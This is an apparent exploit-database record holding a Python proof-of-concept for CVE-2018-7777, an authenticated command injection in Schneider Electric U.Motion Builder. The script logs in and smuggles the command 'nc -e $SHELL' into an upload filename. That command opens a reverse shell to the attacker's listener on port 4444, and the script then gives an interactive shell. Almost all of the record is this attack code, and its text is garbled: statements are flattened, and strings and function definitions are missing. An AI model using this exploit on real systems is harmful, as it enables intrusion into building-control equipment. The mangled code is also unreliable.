{
    "text": "vul_name : Schneider Electric U.Motion Builder 1.3.4 Authenticated Command Injection ， vul_cve : CVE-2018-7777 ， vul_poc :  # Exploit Title : Schneider Electric U.Motion Builder 1.3.4 - Authenticated Command Injection ，  # Date : 2018-08-01 ，  # Exploit Author : Cosmin Craciun ，  # Vendor Homepage :  ，  # Version : <= 1.3.4 ，  # Tested on : Delivered Virtual Appliance running on Windows 10 x64 ，  # CVE : CVE-2018-7777 ，  #  ! /usr/bin/oython ， from _future_ import print_function ， parser = argparse.ArgumentParser ( description='PoC' )  ， parser.add_argument ( '-target' , help='IP or hostname of target' , required=True )  ， parser.add_argument ( '-port' , help='TCP port the target app is running' , required=True , default='8080' )  ， parser.add_argument ( '-username' , help='TCP port the target app is running' , required=True , default='admin' )  ， parser.add_argument ( '-password' , help='TCP port the target app is running' , required=True , default='admin' )  ， parser.add_argument ( '-command' , help='malicious command to run' , default='shell' )  ， parser.add_argument ( '-src_ip' , help='IP of listener for the reverse shell' , required=True )  ， parser.add_argument ( '-timeout' , help='time in seconds to wait for a response' , type=int , default=3 )  ， class Exploiter ( threading.Thread )  :  ， threading.Thread._init_ ( self )  ， self.target = target ， self.port = port ， self.timeout = timeout ， self.uri = uri ， self.body = body ， self.headers = headers ， self.shell_mode = shell_mode ， print ( 'Sending exploit .' )  ， conn = httplib.HTTPConnection ( \"{0} : {1}\".format ( target , port )  , timeout=timeout )  ， conn.request ( \"POST\" , uri , body , headers )  ， print ( \"Exploit sent\" )  ， response = conn.getresponse (  )  ， data = response.read (  )  ， self.send_exploit ( self.target , self.port , self.timeout , self.uri , self.body , self.headers )  ， class Listener ( threading.Thread )  :  ， threading.Thread._init_ ( self )  ， self.src_ip = src_ip ， self.listen ( self.src_ip )  ， TCP_IP = src_ip ， TCP_PORT = 4444 ， BUFFER_SIZE = 1024 ， s = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )  ， s.bind ( TCP_IP , TCP_PORT )  ， print ( \"Listener open on port {0}\".format ( TCP_PORT )  ， s.listen ( 1 )  ， conn , addr = s.accept (  )  ， print ( 'Exploited : ' + str ( addr )  ， comm = raw_input ( \"shell $ \" ) .strip (  )  ， conn.close (  )  ， sys.exit ( 0 )  ， conn.send ( comm + \" 2>&1\" + \"\\x0a\" )  ， data = conn.recv ( BUFFER_SIZE )  ， print ( data , end=\" )  ， print ( \"Could not start listener\" )  ， print ( ex )  ， uri = \" port )  ， params = urllib.urlencode ( { ， 'username' : username ,  ， 'password' : password ,  ， 'rememberMe' : '1' ,  ， 'context' : 'configuration' ,  ， 'op' : 'login' ， } )  ， headers = { ， \"Content-type\" : \"application/x-www-form-urlencoded ; charset=UTF-8\" ,  ， \"Accept\" : \" * / * \" ， } ， conn = httplib.HTTPConnection ( \"{0} : {1}\".format ( target , port )  ， conn.request ( \"POST\" , uri , params , headers )  ， response = conn.getresponse (  )  ， print ( str ( response.status ) + \" \" + response.reason )  ， data = response.read (  )  ， print ( \"Connection timeout while logging in. Check if the server is available\" )  ， cookie = response.getheader ( \"Set-Cookie\" )  ，  # print ( cookie )  ， r = re.match ( r'PHPSESSID= ( .{26} )  ; . * loginSeed= ( .{32} ) ' , cookie )  ， print ( \"Regex not match , could not get cookies\" )  ， print ( \"Error while getting cookies\" )  ， sessid = r.groups (  )  [ 0 ]  ， login_seed = r.groups (  )  [ 1 ]  ， conn.close (  )  ， LIMIT = '-lImIt_of_THE_fIle_eW_ $ ' ， CRLF = '\\r\\n' ， L = [  ]  ， L.append ( '-' + LIMIT )  ， L.append ( 'Content-Disposition : form-data ; name=\"%s\"' % key )  ， L.append ( ' )  ， L.append ( value )  ， L.append ( '-' + LIMIT )  ， L.append ( 'Content-Disposition : form-data ; name=\"%s\" ; filename=\"%s\"' % ( key , filename )  ， L.append ( 'Content-Type : application/x-gzip' )  ， L.append ( ' )  ， L.append ( value )  ， L.append ( '-' + LIMIT + '-' )  ， L.append ( ' )  ， body = CRLF.join ( L )  ， content_type = 'multipart/form-data ; boundary=%s' % LIMIT ， uri = \" port )  ， fields = [  ，  ( 'choose_update_mode' , 'MANUAL' )  ,  ，  ( 'add_button' , '0' )  ,  ，  ( 'format' , 'json' )  ,  ，  ( 'step' , '2' )  ,  ，  ( 'next' , '1' )  ,  ，  ( 'name_update_file' , ' )  ,  ，  ( 'path_update_file' , ' )  ,  ，  ( 'type_update_file' , ' )  ，  ]  ， listener = None ， shell_mode = True ， command = \"nc -e $ SHELL {0} 4444\".format ( args.src_ip )  ， listener = Listener ( args.src_ip )  ， listener.start (  )  ， time.sleep ( 3 )  ， shell_mode = False ， files = [  ，  ( 'update_file' , 'my ; {0} ; file.tar.gz'.format ( command )  , \"\\x1f\\x8b\" )  ，  ]  ， content_type , body = encode_multipart_formdata ( fields , files )  ， print ( 'Logging in .' )  ， sess_id , login_seed = login ( target , port , username , password )  ， print ( 'Error while logging in' )  ， print ( 'Logged in ! ' )  ， headers = { ， 'Accept' : 'application/json , text/javascript ,  * / *  ; q=0.01' ,  ， 'Accept-Encoding' : 'gzip , deflate' ,  ， 'Referer' : ' port )  ,  ， 'X-Requested-With' : 'XMLHttpRequest' ,  ， 'Content-Length' : len ( body )  ,  ， 'Content-Type' : content_type ,  ， 'Connection' : 'keep-alive' ,  ， 'Cookie' : 'PHPSESSID={0} ; loginSeed={1}'.format ( sess_id , login_seed )  ， } ， exploiter = Exploiter ( target , port , timeout , uri , body , headers , shell_mode )  ， exploiter.start (  )  ， args = parser.parse_args (  )  ， exploit ( args.target , args.port , args.username , args.password , args.command , args.timeout ) ",
    "time": "2020.02.03"
}